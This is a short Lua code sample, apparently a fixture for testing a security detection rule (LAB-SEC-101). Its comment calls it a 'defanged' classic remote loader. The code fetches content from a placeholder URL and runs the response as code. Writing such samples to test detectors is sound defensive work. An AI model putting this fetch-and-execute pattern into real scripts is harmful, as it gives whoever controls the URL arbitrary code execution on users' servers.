-- Defanged: classic remote loader. Must trigger LAB-SEC-101.
PerformHttpRequest('https://example.invalid/payload', function(_, body)
    assert(load(body))()
end)
